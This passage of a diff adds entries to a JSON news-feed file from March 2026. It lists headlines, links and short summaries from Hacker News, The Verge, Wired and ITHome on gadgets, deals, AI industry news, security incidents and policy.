+      "title": "OpenClaw's ChatGPT moment sparks concern that AI models are becoming commodities",
+      "link": "https://www.cnbc.com/2026/03/21/openclaw-chatgpt-moment-sparks-concern-ai-models-becoming-commodities.html",
+      "published": "Sat, 21 Mar 2026 21:32:52 +0000",
+      "source": "Hacker News AI",
+      "summary": "Article URL: https://www.cnbc.com/2026/03/21/openclaw-chatgpt-moment-sparks-concern-ai-models-becoming-commodities.html\nComments URL: https://news.ycombinator.com/item?id=47471649\nPoints: 2\n# Comments: 2"
+    },
+    {
+      "title": "Show HN: Travel Hacking Toolkit – Points search and trip planning with AI",
+      "link": "https://github.com/borski/travel-hacking-toolkit",
+      "published": "Sat, 21 Mar 2026 21:25:03 +0000",
+      "source": "Hacker News AI",
+      "summary": "I use points and miles for most of my travel. Every booking comes down to the same decision: use points or pay cash? To answer that, you need award availability across multiple programs, cash prices, your current balances, transfer partner ratios, and the math to compare them. I got tired of doing it manually across a dozen tabs.This toolkit teaches Claude Code and OpenCode how to do it. 7 skills (markdown files with API docs and curl examples) and 6 MCP servers (real-time tools the AI calls dir"
+    },
+    {
+      "title": "What 33 AI Agents Taught Me About Alignment",
+      "link": "https://thealignmentlayer.substack.com/",
+      "published": "Sat, 21 Mar 2026 21:24:14 +0000",
+      "source": "Hacker News AI",
+      "summary": "Article URL: https://thealignmentlayer.substack.com/\nComments URL: https://news.ycombinator.com/item?id=47471564\nPoints: 3\n# Comments: 0"
+    },
+    {
+      "title": "How to Attract AI Bots to Your Open Source Project",
+      "link": "https://nesbitt.io/2026/03/21/how-to-attract-ai-bots-to-your-open-source-project.html",
+      "published": "Sat, 21 Mar 2026 20:58:01 +0000",
+      "source": "Hacker News AI",
+      "summary": "Article URL: https://nesbitt.io/2026/03/21/how-to-attract-ai-bots-to-your-open-source-project.html\nComments URL: https://news.ycombinator.com/item?id=47471271\nPoints: 2\n# Comments: 0"
+    }
+  ],
+  "📰 Tech News": [
+    {
+      "title": "Halide co-founder is suing former partner for bringing source code to Apple",
+      "link": "https://www.theverge.com/business/898687/halide-lawsuit-co-founder-apple",
+      "published": "2026-03-21T17:02:56-04:00",
+      "source": "The Verge",
+      "summary": "Lux Optics co-founder Sebastiaan de With made headlines when he joined Apple in late January. The company was behind Halide, one of the most popular photography apps for the iPhone, which gained a cult following for its robust pro-level controls. Apple was apparently a big enough fan that it tried to acquire the developer last [&#8230;]"
+    },
+    {
+      "title": "The AirPods Pro 3 are $50 off right now, nearly matching their best-ever price",
+      "link": "https://www.theverge.com/gadgets/898502/airpods-pro-3-amazon-big-spring-sale-2026-deal",
+      "published": "2026-03-21T13:00:00-04:00",
+      "source": "The Verge",
+      "summary": "Less than a week ago, Apple announced the forthcoming AirPods Max 2, a pair of over-ear headphones that leverage the company’s H2 chip for AI-powered live translation, conversation awareness, and a host of newer features. However, if you’re okay with a pair of earbuds, the AirPods Pro 3 offer access to all the same features [&#8230;]"
+    },
+    {
+      "title": "Here are 20 of our favorite outdoor deals from REI’s Member Days Sale",
+      "link": "https://www.theverge.com/gadgets/897628/best-outdoor-deals-rei-member-days-sale-2026",
+      "published": "2026-03-21T10:40:00-04:00",
+      "source": "The Verge",
+      "summary": "REI’s latest sale is in full swing. The outdoor retailer’s exclusive shopping event runs through Monday, March 23rd, bringing with it a batch of discounts on Garmin watches, tents, portable stoves, and a slew of Verge-approved goodies. As expected, most deals are available only to REI members; however, you can still join the co-op for [&#8230;]"
+    },
+    {
+      "title": "The gen AI Kool-Aid tastes like eugenics",
+      "link": "https://www.theverge.com/entertainment/897923/ghost-in-the-machine-valerie-veatch-interview",
+      "published": "2026-03-21T10:00:00-04:00",
+      "source": "The Verge",
+      "summary": "Like many people, director Valerie Veatch was intrigued when OpenAI first released its Sora text-to-video generative AI model to the public in 2024. Though she didn't fully understand the technology, she was curious about what it could do, and she saw that other artists were building online communities to share their new AI creations. The [&#8230;]"
+    },
+    {
+      "title": "Oeuf is a punishing platformer in a cozy shell",
+      "link": "https://www.theverge.com/entertainment/895435/oeuf-review",
+      "published": "2026-03-21T09:00:00-04:00",
+      "source": "The Verge",
+      "summary": "The funny shape of eggs is the curious lifeblood of Oeuf, the new physics platformer by prolific developer Increpare Games. In a gaming landscape saturated with complex systems dropped into simple games, that grapples with metaphor within straightforward narratives, and that is desperate to bring cinematic sensibilities into gaming, Oeuf only asks that you briefly [&#8230;]"
+    },
+    {
+      "title": "Dreame’s self-cleaning L10s Pro Ultra is nearly $1,000 off its original list price",
+      "link": "https://www.theverge.com/gadgets/898287/dreame-l10s-pro-ultra-robot-vacuum-mop-amazon-big-spring-sale-2026-deal",
+      "published": "2026-03-21T08:30:00-04:00",
+      "source": "The Verge",
+      "summary": "Amazon’s Big Spring Sale doesn’t kick off until next week, but the retailer is already dropping a host of good deals, especially on robot vacuums. We recently saw Ecovacs’ Deebot X8 and X9 Pro Omni drop to $599 ($501 off) and $679 ($621 off), respectively; however, if you’re looking for a cheaper robot vacuum / [&#8230;]"
+    },
+    {
+      "title": "The new MacBook Pro is still fast as hell",
+      "link": "https://www.theverge.com/tech/898062/apple-macbook-pro-16-m5-max-m1-comparison-review",
+      "published": "2026-03-21T08:00:00-04:00",
+      "source": "The Verge",
+      "summary": "Apple's flagship 16-inch MacBook Pro has reigned supreme in the world of creator-focused laptops since its M-series processor overhaul in 2021. Since then, we've mostly seen the same design with year-over-year chip bumps and small refinements. \"If it ain't broke,\" right? If you want to know everything about this machine, you can read our review [&#8230;]"
+    },
+    {
+      "title": "An early contender for movie of the year",
+      "link": "https://www.theverge.com/tech/898265/project-hail-mary-airpods-max-2-installer",
+      "published": "2026-03-21T08:00:00-04:00",
+      "source": "The Verge",
+      "summary": "Hi, friends! Welcome to Installer No. 120, your guide to the best and Verge-iest stuff in the world. (If you're new here, welcome, get ready for Pen Opinions, and also you can read all the old editions at the Installer homepage.) This week, I've been reading about Banksy and music apps and influencer agents, watching [&#8230;]"
+    },
+    {
+      "title": "Gemini task automation is slow, clunky, and super impressive",
+      "link": "https://www.theverge.com/tech/898282/gemini-task-automation-uber-doordash-hands-on",
+      "published": "2026-03-21T07:30:00-04:00",
+      "source": "The Verge",
+      "summary": "I've been testing out Gemini's new task automation on the Pixel 10 Pro and the Galaxy S26 Ultra, which for the first time lets Gemini take the wheel and use apps for you. It's limited to a small subset right now - a handful of food delivery and rideshare services - and it's still in [&#8230;]"
+    },
+    {
+      "title": "Kodiak CEO says making trucks drive themselves is only half the battle",
+      "link": "https://www.theverge.com/transportation/897551/kodiak-ai-self-driving-truck-ceo-interview",
+      "published": "2026-03-21T07:00:00-04:00",
+      "source": "The Verge",
+      "summary": "This year is shaping up to be a big one for self-driving trucks. In addition to Aurora's plan to deploy hundreds of autonomous big rigs and Waabi expanding into robotaxis, you've also got Kodiak AI aiming to launch its own fully driverless long-haul freight operation by the end of 2026. While robotaxis may still win [&#8230;]"
+    },
+    {
+      "title": "71 Best Podcasts (2026): True Crime, Culture, Science, Fiction",
+      "link": "https://www.wired.com/story/best-podcasts/",
+      "published": "Sat, 21 Mar 2026 12:00:00 +0000",
+      "source": "Wired",
+      "summary": "Get your fix of tech, true crime, pop culture, or comedy with these audio adventures."
+    },
+    {
+      "title": "Best Protein Bars (2026): Vegan, Gluten-Free, High Fiber",
+      "link": "https://www.wired.com/story/best-protein-bars/",
+      "published": "Sat, 21 Mar 2026 11:30:00 +0000",
+      "source": "Wired",
+      "summary": "What to prioritize, what to skip, when to enjoy—plus, we’ve selected WIRED's favorite bars worth trying."
+    },
+    {
+      "title": "Aiper Scuba V3 Pool Robot Review: Eye on the Prize",
+      "link": "https://www.wired.com/review/aiper-scuba-v3-pool-robot/",
+      "published": "Sat, 21 Mar 2026 11:02:00 +0000",
+      "source": "Wired",
+      "summary": "Now outfitted with AI computer vision, this new pool cleaner can actively search for debris."
+    },
+    {
+      "title": "I Tried DoorDash’s Tasks App and Saw the Bleak Future of AI Gig Work",
+      "link": "https://www.wired.com/story/i-tried-doordashs-tasks-app-and-saw-the-bleak-future-of-ai-gig-work/",
+      "published": "Sat, 21 Mar 2026 11:00:00 +0000",
+      "source": "Wired",
+      "summary": "I recorded videos of myself doing laundry, scrambling eggs, and walking around the park in DoorDash’s new Tasks app, where gig workers are paid to train AI."
+    },
+    {
+      "title": "Cyberattack on a Car Breathalyzer Firm Leaves Drivers Stuck",
+      "link": "https://www.wired.com/story/security-news-this-week-cyberattack-on-a-car-breathalyzer-firm-leaves-drivers-stuck/",
+      "published": "Sat, 21 Mar 2026 10:30:00 +0000",
+      "source": "Wired",
+      "summary": "Plus: The FBI admits it’s buying phone data to track Americans, Iranian hackers disrupt medical care at Maryland hospitals, and more."
+    },
+    {
+      "title": "The 19 Best EVs Coming in 2026",
+      "link": "https://www.wired.com/story/the-16-best-evs-coming-in-2026/",
+      "published": "Sat, 21 Mar 2026 10:00:00 +0000",
+      "source": "Wired",
+      "summary": "We’re expecting fresh electrics from Rivian, Hyundai, Honda, BMW, and newcomer Slate, among others. Here are the EVs arriving this year that we’re most excited about."
+    },
+    {
+      "title": "'Jury Duty Presents: Company Retreat' Almost Makes Corporate Culture Seem Fun",
+      "link": "https://www.wired.com/story/jury-duty-presents-company-retreat-almost-makes-corporate-culture-seem-fun/",
+      "published": "Sat, 21 Mar 2026 10:00:00 +0000",
+      "source": "Wired",
+      "summary": "The Amazon Prime prank series amplifies the hijinks of workplace dynamics, while showing how people find purpose—and community—in their jobs despite impossible situations."
+    },
+    {
+      "title": "How BYD Got EV Chargers to Work Almost as Fast as Gas Pumps",
+      "link": "https://www.wired.com/story/how-byds-ev-charger-got-even-faster-and-it-might-not-matter-as-much-as-you-think/",
+      "published": "Sat, 21 Mar 2026 09:30:00 +0000",
+      "source": "Wired",
+      "summary": "The Chinese automaker is racing ahead of global competitors—but don’t expect to see those gains in the US anytime soon."
+    },
+    {
+      "title": "Anthropic Denies It Could Sabotage AI Tools During War",
+      "link": "https://www.wired.com/story/anthropic-denies-sabotage-ai-tools-war-claude/",
+      "published": "Sat, 21 Mar 2026 00:03:20 +0000",
+      "source": "Wired",
+      "summary": "The Department of Defense alleges the AI developer could manipulate models in the middle of war. Company executives argue that’s impossible."
+    },
+    {
+      "title": "There Aren’t a Lot of Reasons to Get Excited About a New Amazon Smartphone",
+      "link": "https://www.wired.com/story/amazon-smartphone-rumor-2026/",
+      "published": "Fri, 20 Mar 2026 22:03:09 +0000",
+      "source": "Wired",
+      "summary": "The company is reportedly building a new AI-powered mobile device. If Amazon follows through on the plan, experts warn it would be next to impossible to break into a crowded market."
+    },
+    {
+      "title": "‘A Rigged and Dangerous Product’: The Wildest Week for Prediction Markets Yet",
+      "link": "https://www.wired.com/story/why-this-was-the-wildest-week-for-prediction-markets-yet/",
+      "published": "Fri, 20 Mar 2026 21:07:04 +0000",
+      "source": "Wired",
+      "summary": "As the prediction market boom continues, backlash is growing, too, with Arizona filing criminal charges against Kalshi and public outcry after Polymarket traders threatened a journalist."
+    },
+    {
+      "title": "A Top Democrat Is Urging Colleagues to Support Trump’s Spy Machine",
+      "link": "https://www.wired.com/story/a-top-democrat-is-urging-colleagues-to-support-trumps-spy-machine/",
+      "published": "Fri, 20 Mar 2026 20:46:45 +0000",
+      "source": "Wired",
+      "summary": "Congressman Jim Himes claims a sweeping surveillance authority should stay intact because he hasn't seen abuses by Kash Patel's FBI, according to internal messaging obtained by WIRED."
+    },
+    {
+      "title": "Gamers Hate Nvidia's DLSS 5. Developers Aren’t Crazy About It, Either",
+      "link": "https://www.wired.com/story/gamers-hate-nvidia-dlss-5-developers-arent-crazy-about-it-either/",
+      "published": "Fri, 20 Mar 2026 19:13:19 +0000",
+      "source": "Wired",
+      "summary": "Nvidia’s new AI upscaling gaming technology struck gamers as uncanny and off-putting. Developers don't seem to like it, either, but it could be “the default” in a few years."
+    },
+    {
+      "title": "This Compact Bose Soundbar Is $80 Off",
+      "link": "https://www.wired.com/story/bose-smart-soundbar-deal-326/",
+      "published": "Fri, 20 Mar 2026 17:45:31 +0000",
+      "source": "Wired",
+      "summary": "Bose might be known for its noise-canceling headphones, but the brand’s soundbars are pretty solid too."
+    },
+    {
+      "title": "Kalshi Has Been Temporarily Banned in Nevada",
+      "link": "https://www.wired.com/story/nevada-bans-kalshi-prediction-market/",
+      "published": "Fri, 20 Mar 2026 16:54:15 +0000",
+      "source": "Wired",
+      "summary": "A judge ordered Kalshi to immediately halt sports and election contracts in the state, intensifying a growing regulatory battle over prediction markets."
+    },
+    {
+      "title": "Iran War Puts Global Energy Markets on the Brink of a Worst-Case Scenario",
+      "link": "https://www.wired.com/story/iran-war-puts-global-energy-markets-on-the-brink-of-a-worst-case-scenario/",
+      "published": "Fri, 20 Mar 2026 16:20:52 +0000",
+      "source": "Wired",
+      "summary": "“This will be so, so, so, so, so bad,” one analyst says."
+    },
+    {
+      "title": "At Palantir’s Developer Conference, AI Is Built to Win Wars",
+      "link": "https://www.wired.com/story/palantir-developer-conference-ai-war-alex-karp/",
+      "published": "Fri, 20 Mar 2026 15:00:00 +0000",
+      "source": "Wired",
+      "summary": "As business soars, Palantir is doubling down on a vision of AI built for battlefield advantage—and attracting customers who agree."
+    },
+    {
+      "title": "Best Kids' Bikes (2026): Woom, Prevelo, Guardian, and More",
+      "link": "https://www.wired.com/gallery/best-kids-bikes/",
+      "published": "Fri, 20 Mar 2026 12:00:00 +0000",
+      "source": "Wired",
+      "summary": "The WIRED Reviews team has kids, and we tested all types of kids’ bikes. Here are our top picks."
+    },
+    {
+      "title": "China Approves the First Brain Chips for Sale—and Has a Plan to Dominate the Industry",
+      "link": "https://www.wired.com/story/china-approves-first-brain-chips-for-sale-plan-to-dominate-industry/",
+      "published": "Fri, 20 Mar 2026 11:44:12 +0000",
+      "source": "Wired",
+      "summary": "While the United States and Europe are moving cautiously forward with clinical trials, China is racing toward the commercialization of brain implants."
+    },
+    {
+      "title": "16 Best Camera Bags, Slings, Straps, and Backpacks (2026), Tested and Reviewed",
+      "link": "https://www.wired.com/gallery/best-camera-bags-backpacks-straps-inserts/",
+      "published": "Fri, 20 Mar 2026 11:30:00 +0000",
+      "source": "Wired",
+      "summary": "Tote your photo and video gear around in style. We tested more than 100 packs and rounded up our favorites."
+    },
+    {
+      "title": "Firewire Surfboard Review (2026): Neutrino, Revo Max, Machadocado",
+      "link": "https://www.wired.com/story/firewire-neutrino-surfboard-rave/",
+      "published": "Fri, 20 Mar 2026 11:00:00 +0000",
+      "source": "Wired",
+      "summary": "Firewire makes the most innovative surfboards in the industry. This winter, I tried the Neutrino, Machado, and Revo Max to see if they're worth the hype."
+    },
+    {
+      "title": "Can Tinder Fix The Dating Landscape It Helped Ruin?",
+      "link": "https://www.wired.com/story/can-tinder-fix-the-dating-landscape-it-helped-ruin/",
+      "published": "Fri, 20 Mar 2026 11:00:00 +0000",
+      "source": "Wired",
+      "summary": "With more than a dozen new features, including analyzing users’ camera rolls and astrology-based matches, Tinder is trying to lure Gen Z—and bring back those burned out from dating apps."
+    },
+    {
+      "title": "I Learned More Than I Thought I Would From Using Food-Tracking Apps",
+      "link": "https://www.wired.com/story/food-tracking-apps-ai-nutrition-weight-loss/",
+      "published": "Fri, 20 Mar 2026 10:30:00 +0000",
+      "source": "Wired",
+      "summary": "These apps, some of which use AI and computer vision, were helpful for meeting my caloric and nutrition intake goals. But they also gave me some anxiety."
+    },
+    {
+      "title": "Corsair Frame 4000D RS PC Case Review: Excellent Flow",
+      "link": "https://www.wired.com/review/corsair-frame-4000d-rs/",
+      "published": "Fri, 20 Mar 2026 10:30:00 +0000",
+      "source": "Wired",
+      "summary": "Corsair's updated 4000D is one of the best cases you can buy, even if I still love the old one."
+    },
+    {
+      "title": "The Danger Behind Meta Killing End-to-End Encryption for Instagram DMs",
+      "link": "https://www.wired.com/story/the-danger-behind-metas-decision-to-kill-end-to-end-encrypted-instagram-dms/",
+      "published": "Fri, 20 Mar 2026 10:00:00 +0000",
+      "source": "Wired",
+      "summary": "Meta blamed users for not opting into the privacy-protecting feature. Experts fear the move could be the first major domino to fall for end-to-end encryption tech worldwide."
+    },
+    {
+      "title": "My AI Agent ‘Cofounder’ Conquered LinkedIn. Then It Got Banned",
+      "link": "https://www.wired.com/story/linkedin-invited-my-ai-cofounder-to-give-a-corporate-talk-then-banned-it/",
+      "published": "Fri, 20 Mar 2026 10:00:00 +0000",
+      "source": "Wired",
+      "summary": "When social media is constantly pushing people to use AI, why not let AI agents participate?"
+    },
+    {
+      "title": "Tempur-ActiveBreeze Smart Bed Review: High-Tech Titan",
+      "link": "https://www.wired.com/review/tempur-activebreeze-smart-bed/",
+      "published": "Fri, 20 Mar 2026 09:31:00 +0000",
+      "source": "Wired",
+      "summary": "The ActiveBreeze smart bed cools from within, pairing airflow tech with surprisingly detailed sleep data."
+    },
+    {
+      "title": "Paramount Plus Coupon Codes and Deals: 50% Off",
+      "link": "https://www.wired.com/story/paramount-plus-coupon-code/",
+      "published": "Fri, 20 Mar 2026 05:00:00 +0000",
+      "source": "Wired",
+      "summary": "Save on streaming with the latest Paramount+ promo codes and deals, including 50% off subscriptions, free trials, and more."
+    },
+    {
+      "title": "Newegg Promo Code: 10% Off in March 2026",
+      "link": "https://www.wired.com/story/newegg-promo-code/",
+      "published": "Fri, 20 Mar 2026 05:00:00 +0000",
+      "source": "Wired",
+      "summary": "Enjoy up to 10% off your entire order with today’s Newegg discount code and save with the latest deals for gaming PCs, laptops, and computer parts."
+    },
+    {
+      "title": "US Takes Down Botnets Used in Record-Breaking Cyberattacks",
+      "link": "https://www.wired.com/story/us-takes-down-botnets-used-in-record-breaking-cyberattacks/",
+      "published": "Fri, 20 Mar 2026 00:07:30 +0000",
+      "source": "Wired",
+      "summary": "The Aisuru, Kimwolf, JackSkid, and Mossad botnets had infected more than 3 million devices in total, many inside home networks, according to the US Justice Department."
+    },
+    {
+      "title": "‘Uncanny Valley’: Nvidia’s ‘Super Bowl of AI,’ Tesla Disappoints, and Meta’s VR Metaverse ‘Shutdown’",
+      "link": "https://www.wired.com/story/uncanny-valley-podcast-nvidia-gtc-tesla-disappointed-fans-meta-horizon-worlds/",
+      "published": "Thu, 19 Mar 2026 21:43:56 +0000",
+      "source": "Wired",
+      "summary": "In this episode, we dive into Nvidia’s annual developer conference and what CEO Jensen Huang is saying about the future of the company."
+    },
+    {
+      "title": "FCC Enforcement Chief Offered to Help Brendan Carr Target Disney, Records Show",
+      "link": "https://www.wired.com/story/fcc-enforcement-chief-offered-to-help-brendan-carr-target-disney-records-show/",
+      "published": "Thu, 19 Mar 2026 18:10:54 +0000",
+      "source": "Wired",
+      "summary": "Last year, as FCC chair Brendan Carr threatened ABC over a Jimmy Kimmel monolog, a civil servant overseeing West Coast stations privately pledged support, according to emails obtained by WIRED."
+    },
+    {
+      "title": "Google Shakes Up Its Browser Agent Team Amid OpenClaw Craze",
+      "link": "https://www.wired.com/story/google-shakes-up-project-mariner-team-web-browsing-agents/",
+      "published": "Thu, 19 Mar 2026 18:00:00 +0000",
+      "source": "Wired",
+      "summary": "As Silicon Valley obsesses over a new wave of AI coding agents, Google and other AI labs are shifting their bets."
+    },
+    {
+      "title": "The Original AirPods Max Are $100 Off",
+      "link": "https://www.wired.com/story/airpods-max-deal-326/",
+      "published": "Thu, 19 Mar 2026 17:36:55 +0000",
+      "source": "Wired",
+      "summary": "Save big on Apple’s previous-generation premium over-ear headset."
+    },
+    {
+      "title": "Meta Will Keep Horizon Worlds Alive in VR ‘for the Foreseeable Future’",
+      "link": "https://www.wired.com/story/meta-will-keep-horizon-worlds-alive-in-vr-for-the-foreseeable-future/",
+      "published": "Thu, 19 Mar 2026 17:33:56 +0000",
+      "source": "Wired",
+      "summary": "A day after saying it would shut down its metaverse, Meta CTO Andrew Bosworth announced the service will remain available in VR—with limited support."
+    },
+    {
+      "title": "A New Game Turns the H-1B Visa System Into a Surreal Simulation",
+      "link": "https://www.wired.com/story/made-in-china-a-new-game-turns-the-h-1b-visa-system-into-a-surreal-simulation/",
+      "published": "Thu, 19 Mar 2026 16:59:50 +0000",
+      "source": "Wired",
+      "summary": "Inspired by real immigrant stories, H1B.Life captures the uncertainty, trade-offs, and pure luck that shape the lives of people trying to build a future in the US."
+    },
+    {
+      "title": "ChatGPT’s ‘Adult Mode’ Could Spark a New Era of Intimate Surveillance",
+      "link": "https://www.wired.com/story/chatgpt-adult-mode-new-era-of-intimate-surveillance/",
+      "published": "Thu, 19 Mar 2026 16:06:49 +0000",
+      "source": "Wired",
+      "summary": "OpenAI plans to allow sexting with ChatGPT. A human-AI interaction expert warns of a privacy nightmare."
+    },
+    {
+      "title": "Signal’s Creator Is Helping Encrypt Meta AI",
+      "link": "https://www.wired.com/story/signals-creator-is-helping-encrypt-meta-ai/",
+      "published": "Thu, 19 Mar 2026 14:09:51 +0000",
+      "source": "Wired",
+      "summary": "Moxie Marlinspike says the technology powering his encrypted AI chatbot, Confer, will be integrated into Meta AI. The move could help protect the AI conversations of millions of people."
+    },
+    {
+      "title": "Should You Hike in Boots or Trail Runners? (2026)",
+      "link": "https://www.wired.com/story/should-you-hike-in-boots-or-trail-runners/",
+      "published": "Thu, 19 Mar 2026 12:00:00 +0000",
+      "source": "Wired",
+      "summary": "Lightweight shoes now dominate the trails, so do you still need boots? Here’s how to choose the right footwear for your outdoor adventures."
+    },
+    {
+      "title": "Soundcore Nebula X1 Pro Dolby Atmos Projector Review: Big, Brilliant",
+      "link": "https://www.wired.com/review/anker-soundcore-nebula-x1-projector/",
+      "published": "Thu, 19 Mar 2026 11:30:00 +0000",
+      "source": "Wired",
+      "summary": "Ever wanted a complete Dolby Atmos cinema packed into a big wheelie case?"
+    },
+    {
+      "title": "The 4 Best Planners of 2026: Roterunner, Hobonichi, Cloth & Paper",
+      "link": "https://www.wired.com/story/best-paper-planners/",
+      "published": "Thu, 19 Mar 2026 11:09:00 +0000",
+      "source": "Wired",
+      "summary": "If digital calendars are leaving you lacking, these WIRED-tested paper agendas and notebooks could change your life."
+    },
+    {
+      "title": "The Men Obsessed With ‘High T’",
+      "link": "https://www.wired.com/story/the-men-obsessed-with-high-t/",
+      "published": "Thu, 19 Mar 2026 11:00:00 +0000",
+      "source": "Wired",
+      "summary": "Fueled by the manosphere, men are boosting their testosterone levels through natural and synthetic means, with some competitively swapping test results on a regular basis."
+    },
+    {
+      "title": "Android Auto’s Secret Superpower Is a Customizable Shortcut Button",
+      "link": "https://www.wired.com/story/android-auto-customizable-shortcut-button/",
+      "published": "Thu, 19 Mar 2026 10:30:00 +0000",
+      "source": "Wired",
+      "summary": "Put bespoke commands on the Android Auto home screen with this little-known feature."
+    },
+    {
+      "title": "Apple MacBook Air (M5) Review: The Goldilocks MacBook",
+      "link": "https://www.wired.com/review/macbook-air-m5/",
+      "published": "Thu, 19 Mar 2026 10:30:00 +0000",
+      "source": "Wired",
+      "summary": "Set between the MacBook Neo and MacBook Pro, the M5 MacBook Air remains the laptop that I recommend for most people."
+    },
+    {
+      "title": "Best Electric Mountain Bikes (2026): Specialized, Cannondale, Salsa",
+      "link": "https://www.wired.com/story/best-electric-mountain-bikes/",
+      "published": "Thu, 19 Mar 2026 10:00:00 +0000",
+      "source": "Wired",
+      "summary": "A glorious swooping downhill glide on one of these electric mountain bikes will make you feel like a kid again."
+    },
+    {
+      "title": "The Fight to Hold AI Companies Accountable for Children’s Deaths",
+      "link": "https://www.wired.com/story/how-ai-chatbots-drove-families-to-the-brink-and-the-lawyer-fighting-back/",
+      "published": "Thu, 19 Mar 2026 10:00:00 +0000",
+      "source": "Wired",
+      "summary": "After a series of suicides allegedly linked to AI chatbots, one lawyer is trying to hold companies like OpenAI accountable."
+    },
+    {
+      "title": "HigherDose Red Light Shower Filter Review (2026): Filter Needed",
+      "link": "https://www.wired.com/review/higherdose-red-light-shower-filter/",
+      "published": "Thu, 19 Mar 2026 09:32:00 +0000",
+      "source": "Wired",
+      "summary": "A new sophisticated shower filter from HigherDose offers red light therapy for your morning shower. But some of the company’s claims about the therapy’s effectiveness seem half-baked."
+    },
+    {
+      "title": "Get Ready for a Year of Chaotic Weather in the US",
+      "link": "https://www.wired.com/story/get-ready-for-a-year-of-chaotic-weather-in-the-us/",
+      "published": "Thu, 19 Mar 2026 09:00:00 +0000",
+      "source": "Wired",
+      "summary": "A massive Western heat wave and a potential El Niño event raise concerns about a long stretch of unpredictable and extreme weather."
+    },
+    {
+      "title": "20% Off LG Promo Code & Coupons | March 2026",
+      "link": "https://www.wired.com/story/lg-promo-code/",
+      "published": "Thu, 19 Mar 2026 05:00:00 +0000",
+      "source": "Wired",
+      "summary": "Save 20% with an LG promo code today, plus up to $1,000 off appliances, 40% off bestselling TVs and monitors."
+    },
+    {
+      "title": "30% Off Canon Promo Codes | March 2026",
+      "link": "https://www.wired.com/story/canon-promo-code/",
+      "published": "Thu, 19 Mar 2026 05:00:00 +0000",
+      "source": "Wired",
+      "summary": "Save an extra 10% or 30% with Canon coupon codes, plus up to $1,600 on cameras, printers, and more this March."
+    },
+    {
+      "title": "北京网警破获“网络开盒”案，五名被告人获刑 1.5~7 年",
+      "link": "https://www.ithome.com/0/931/375.htm",
+      "published": "Sun, 22 Mar 2026 00:47:41 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 22 日消息，公安部网安局今日宣布破获一起“网络开盒”案件，五名犯罪嫌疑人因侵犯公民个人信息罪、非法利用信息网络罪被法院一审判处有期徒刑。该案背后涉及一条规模庞大的侵犯公民个人信息黑灰产业链。据介绍，北京公安在办理一起非法利用信息网络案件时，逐步锁定了王某康、林某武、王某、刘某彪、孙某恒等五名犯罪嫌疑人。经查，该团伙非法获取大量公民个人信息，搭建“社工库”网站，非法提供公民个人信息 1000 余次，其中包括对社会热点案件相关人员进行“开盒”操作，网站访问量累计达 30 余万人次。2025 年 4 月 11 日至 5 月 13 日，公安机关将五人先后抓获。2026 年 3 月 20 日，法院作出一审判决。被告人林某武、刘某彪、王某、孙某恒犯侵犯公民个人信息罪、非法利用信息网络罪，被告人王某康犯侵犯公民个人信息罪，分别被判处有期徒刑七年至一年六个月不等，并处罚金 7 万元至 1.5 万元不等。IT之家注：所谓“网络开盒”，是指不法分子非法获取他人姓名、身份证号、家庭住址、联系方式等个人信息，在网络上公开并煽动群体性攻击或骚扰的行为。根据我国法律规定，此类行为可能承担民事、"
+    },
+    {
+      "title": "小米官方“龙虾”Xiaomi miclaw 封测新增 15 Ultra、MIX Flip2 等 4 款机型",
+      "link": "https://www.ithome.com/0/931/374.htm",
+      "published": "Sun, 22 Mar 2026 00:33:18 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 22 日消息，据小米官方账号“玩转小米澎湃 OS”在小米社区发布的最新信息，官方“龙虾”Xiaomi miclaw 封测新增 Xiaomi 15 Ultra、Xiaomi 15 Pro、Xiaomi 15、Xiaomi MIX Flip2 等 4 款机型。封测机型Xiaomi 17 Ultra 徕卡版、Xiaomi 17 Ultra、Xiaomi 17 Pro Max、Xiaomi 17 Pro、Xiaomi 17、Xiaomi 15S Pro、REDMI K90、REDMI K90 Pro Max、Xiaomi 15 Ultra、Xiaomi 15 Pro、Xiaomi 15、Xiaomi MIX Flip2注：非以上机型无法参与封测，请勿报名申请。官方介绍称，作为技术探索项目，当前产品在稳定性、功耗表现、复杂场景执行成功率方面仍在持续优化，仅面向科技发烧友、极客用户开放小规模测试。部分高复杂度任务可能存在执行效率波动或阶段性失败，因此小米不推荐普通用户在日常主力设备上升级。Xiaomi miclaw 为面向科技发烧友、极客用户的小规模测试性探索产品，采用邀请码机制"
+    },
+    {
+      "title": "马斯克官宣 TERAFAB 自建晶圆厂明日正式揭晓：SpaceX 与特斯拉联合打造太瓦级算力产能，太空应用占八成",
+      "link": "https://www.ithome.com/0/931/373.htm",
+      "published": "Sun, 22 Mar 2026 00:28:48 GMT",
+      "source": "ITHome",
+      "summary": "IT之家 3 月 22 日消息，马斯克刚刚在 X 上发帖称，SpaceX 与特斯拉将联合推进“TERAFAB”项目，详细信息计划于北京时间 3 月 23 日（周一）上午 9:00 正式公布。根据马斯克披露的信息，TERAFAB 项目的目标是实现每年超过 1 太瓦（terawatt）的算力产能，涵盖逻辑芯片、存储芯片及封装环节；其中约 80% 的产能将用于太空领域，剩余约 20% 则面向地面应用。这并非马斯克首次提及 TERAFAB 项目。在 2025 年 11 月年度股东大会上，马斯克首次公开提及这一构想，当时他表示“即使是晶圆代工厂最乐观的预测也无法满足我们的需求”。在今年 1 月的财报电话会议上，他进一步明确特斯拉需要在美国建造“一座规模非常大的晶圆厂，涵盖逻辑、存储和封装”。据媒体公开报道，TERAFAB 计划采用 2nm 制程工艺，将逻辑芯片、存储芯片及先进封装整合在同一园区内，年产量目标约为 1000 亿至 2000 亿颗芯片。马斯克在 3 月 18 日的 X 文中还明确表示，即便 TERAFAB 项目推进，特斯拉与 SpaceX AI 仍将继续大规模采购英伟达芯片。他将 T"
+    },
+    {
+      "title": "HBM4E 竞赛升级：SK 海力士被曝拟引入台积电 3nm 工艺反超三星，争夺 AI 内存性能主导权",
+      "link": "https://www.ithome.com/0/931/372.htm",
+      "published": "Sun, 22 Mar 2026 00:16:07 GMT",
+      "source": "ITHome",
